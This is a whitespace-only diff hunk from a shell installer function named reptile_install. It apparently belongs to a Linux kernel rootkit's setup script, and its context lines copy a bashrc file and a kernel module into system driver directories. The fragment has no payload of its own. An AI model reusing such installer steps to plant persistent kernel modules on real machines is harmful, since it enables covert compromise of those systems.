@@ -290,7 +290,7 @@ function reptile_install {
 	cp scripts/bashrc /$MODULE/$MODULE"_rc" && \
 	rm -rf bin && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
-
+	
 	echo -ne "Installing... "
     
 	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
